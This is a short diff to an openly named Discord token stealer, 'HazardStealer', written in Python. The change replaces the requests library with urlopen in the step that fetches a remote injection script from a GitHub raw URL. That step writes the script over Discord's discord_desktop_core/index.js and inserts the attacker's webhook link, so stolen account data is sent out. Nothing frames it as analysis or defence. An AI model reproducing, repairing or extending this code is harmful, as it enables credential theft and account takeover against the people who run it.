@@ -3,7 +3,6 @@ if os.name != "nt":
 	exit()
 from re import findall
 import json
-import requests
 import psutil
 import platform as plt
 from json import loads, dumps
@@ -229,9 +228,10 @@ def HazardStealer():
 				if (name.__contains__("discord_desktop_core-")):
 					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
 					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-					index_content = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
+					f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
+					index_content = f.read()
 					with open(directory_list, 'wb') as index_file:
-						index_file.write(index_content.content)
+						index_file.write(index_content)
 					with open(directory_list, 'r+') as index_file2:
 						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
 					with open(directory_list, 'w'): pass
